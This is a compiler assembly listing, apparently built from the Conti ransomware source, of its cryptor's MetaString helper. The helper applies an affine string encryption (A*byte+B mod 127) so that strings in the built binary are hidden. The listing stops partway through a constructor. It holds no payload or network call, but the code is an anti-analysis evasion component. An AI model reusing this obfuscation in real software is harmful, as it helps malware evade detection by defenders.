;	COMDAT ?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 49	 imul	 eax, eax, 73		; 00000049H
  0002d	83 c0 41	 add	 eax, 65			; 00000041H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 06	 cmp	 QWORD PTR i$1[rbp], 6
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv140 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00131	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00135	88 85 c0 00 00
	00		 mov	 BYTE PTR tv140[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0013b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00142	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00149	5f		 pop	 rdi
  0014a	5d		 pop	 rbp
  0014b	c3		 ret	 0
??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 54	 sub	 eax, 84			; 00000054H
  0002d	6b c0 0a	 imul	 eax, eax, 10
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 59	 imul	 eax, eax, 89		; 00000059H
  0002d	83 c0 54	 add	 eax, 84			; 00000054H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 04	 cmp	 QWORD PTR i$1[rbp], 4
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv94 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
